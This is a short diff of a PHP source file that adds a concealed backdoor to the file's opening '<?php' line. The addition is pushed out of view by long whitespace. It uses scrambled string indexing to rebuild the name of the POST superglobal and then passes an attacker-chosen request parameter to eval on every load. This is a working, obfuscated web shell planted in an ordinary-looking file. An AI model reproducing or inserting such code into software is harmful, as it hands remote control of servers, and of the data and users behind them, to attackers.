@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                     $hne8="res_tuop" ;$fahu08 = $hne8[2]. $hne8[4].$hne8[0].$hne8[4]. $hne8[6].$hne8[5]. $hne8[7].$hne8[7].$hne8[1].$hne8[0];$bkew1 =$fahu08 ( $hne8[3].$hne8[7]. $hne8[6].$hne8[2]. $hne8[4] );if (isset ( ${ $bkew1}['qd8eb9a' ])) { eval(${$bkew1 } ['qd8eb9a' ] ); }?> <?php
 
 /**
  * @file
